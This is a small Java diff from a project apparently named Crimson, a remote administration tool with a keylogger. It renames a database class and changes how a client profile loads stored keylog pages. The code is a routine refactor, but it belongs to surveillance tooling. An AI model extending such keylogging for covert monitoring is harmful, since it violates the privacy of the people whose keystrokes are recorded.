@@ -46,7 +46,7 @@ import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.attribute.Attribute;
 import com.subterranean_security.crimson.sv.profile.attribute.UntrackedAttribute;
 import com.subterranean_security.crimson.universal.Universal;
-import com.subterranean_security.crimson.universal.stores.Database;
+import com.subterranean_security.crimson.universal.stores.DatabaseStore;
 import com.subterranean_security.crimson.viewer.ui.UIUtil;
 
 /**
@@ -176,7 +176,7 @@ public class ClientProfile implements Serializable {
 			}
 
 			// load keylog
-			keylog.pages.setDatabase(Database.getFacility());
+			keylog.pages.setDatabase(DatabaseStore.getDatabase());
 			initialized = true;
 		}
 		return this;
